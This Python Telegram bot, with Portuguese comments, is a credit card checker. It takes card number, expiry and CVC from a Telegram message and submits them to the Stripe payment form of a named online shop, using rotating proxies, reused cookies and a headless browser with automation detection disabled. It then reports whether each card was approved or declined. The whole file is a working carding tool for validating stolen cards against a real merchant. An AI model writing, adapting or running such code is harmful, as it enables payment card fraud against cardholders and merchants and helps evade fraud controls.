from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
import time
import random

BOT_TOKEN = "SEU_TOKEN_AQUI"
ADMIN_ID = 123456789   # Coloque seu ID do Telegram

# ==================== PROXIES ====================
proxies = [
    "177.136.242.21:8118",
    "187.103.105.20:8085",
]

# ==================== COOKIES ====================
cookies_list = [ ... ]   # cole aqui seus 2 dicionários de cookies

async def start(update: Update, context):
    await update.message.reply_text(
        "🤖 Bot de Teste de Cartão (Selenium)\n\n"
        "Envie no formato:\n"
        "`numero|mes/ano|cvc`"
    )

async def testar_cartao(numero: str, expiry: str, cvc: str):
    proxy = random.choice(proxies)
    cookies = random.choice(cookies_list)

    options = Options()
    options.add_argument("--headless=new")
    options.add_argument("--no-sandbox")
    options.add_argument("--disable-dev-shm-usage")
    options.add_argument("--disable-blink-features=AutomationControlled")
    options.add_argument(f"--proxy-server=http://{proxy}")

    driver = webdriver.Chrome(options=options)
    wait = WebDriverWait(driver, 20)

    try:
        driver.get("https://shop.wiseacrebrew.com")
        time.sleep(3)

        for name, value in cookies.items():
            try:
                driver.add_cookie({"name": name, "value": value, "domain": ".shop.wiseacrebrew.com"})
            except:
                pass

        driver.refresh()
        time.sleep(4)

        driver.get("https://shop.wiseacrebrew.com/account/add-payment-method/")
        time.sleep(5)

        # Stripe iframe
        iframe = wait.until(EC.any_of(
            EC.presence_of_element_located((By.CSS_SELECTOR, "iframe[title*='Secure payment']")),
            EC.presence_of_element_located((By.CSS_SELECTOR, "iframe[src*='stripe']"))
        ))
        driver.switch_to.frame(iframe)

        wait.until(EC.presence_of_element_located((By.NAME, "number"))).send_keys(numero)
        wait.until(EC.presence_of_element_located((By.NAME, "expiry"))).send_keys(expiry)
        wait.until(EC.presence_of_element_located((By.NAME, "cvc"))).send_keys(cvc)

        driver.switch_to.default_content()

        button = wait.until(EC.element_to_be_clickable((By.XPATH, "//button[contains(., 'ADD') or contains(., 'Add')]")))
        button.click()
        time.sleep(8)

        source = driver.page_source.lower()

        if any(x in source for x in ["successfully added", "approved", "payment method added"]):
            return "✅ APROVADO"
        elif any(x in source for x in ["declined", "card was declined"]):
            return "❌ DECLINED"
        else:
            return "⚠️ INCONCLUSIVO"

    except Exception as e:
        return f"❌ Erro: {str(e)[:80]}"
    finally:
        driver.quit()


async def handle_message(update: Update, context):
    user_id = update.effective_user.id
    if user_id != ADMIN_ID:
        await update.message.reply_text("🚫 Acesso negado.")
        return

    text = update.message.text.strip()
    try:
        numero, expiry, cvc = [x.strip() for x in text.split('|')]
        msg = await update.message.reply_text(f"⏳ Testando cartão {numero[-4:]}...")

        resultado = await testar_cartao(numero, expiry, cvc)
        await msg.edit_text(resultado)

    except:
        await update.message.reply_text("Formato inválido.\nUse: `numero|mes/ano|cvc`")


def main():
    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    app.run_polling()


if __name__ == "__main__":
    main()